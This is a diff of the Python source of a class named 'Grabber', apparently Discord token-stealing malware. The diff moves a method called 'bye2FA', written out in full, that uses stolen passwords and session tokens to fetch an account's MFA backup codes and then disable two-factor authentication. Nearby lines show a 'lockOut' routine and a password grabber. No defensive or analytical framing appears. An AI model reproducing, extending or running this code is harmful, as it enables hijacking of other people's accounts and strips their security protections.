@@ -27,27 +27,6 @@ class Grabber:
         }
         return headers
 
-    def bye2FA(self):
-        for password in self.passwords:
-            for token in self.validTokens:
-                payload = {
-                    "password": password,
-                    "regenerate": False
-                }
-                r = self.session.post('https://discordapp.com/api/v6/users/@me/mfa/codes', headers=self.getHeaders(token), json=payload)
-                for _i in range(10):
-                    backup = r.json()['backup_codes'][_i]['code']
-                    self.backupCodes.append(backup)
-                for code in self.backupCodes:
-                    newPayload = {
-                        'code': code
-                    }
-                    req = self.session.post('https://discordapp.com/api/v6/users/@me/mfa/totp/disable', headers=self.getHeaders(token), json=newPayload)
-                    if req.status_code == 200: # handle later
-                        return True
-                    else:
-                        return False
-
     def lockOut(self):
         self.bye2FA() # remove 2fa before operating
         time = datetime.datetime.now().strftime("%H:%M %p")
@@ -112,6 +91,27 @@ class Grabber:
                             input("Press any key to exit...");exit(0)
                     except:
                         pass
+
+    def bye2FA(self):
+        for password in self.passwords:
+            for token in self.validTokens:
+                payload = {
+                    "password": password,
+                    "regenerate": False
+                }
+                r = self.session.post('https://discordapp.com/api/v6/users/@me/mfa/codes', headers=self.getHeaders(token), json=payload)
+                for _i in range(10):
+                    backup = r.json()['backup_codes'][_i]['code']
+                    self.backupCodes.append(backup)
+                for code in self.backupCodes:
+                    newPayload = {
+                        'code': code
+                    }
+                    req = self.session.post('https://discordapp.com/api/v6/users/@me/mfa/totp/disable', headers=self.getHeaders(token), json=newPayload)
+                    if req.status_code == 200:
+                        return True
+                    else:
+                        return False
 
     def grabPassword(self): 
         # Credits to backslash: https://github.com/backslash
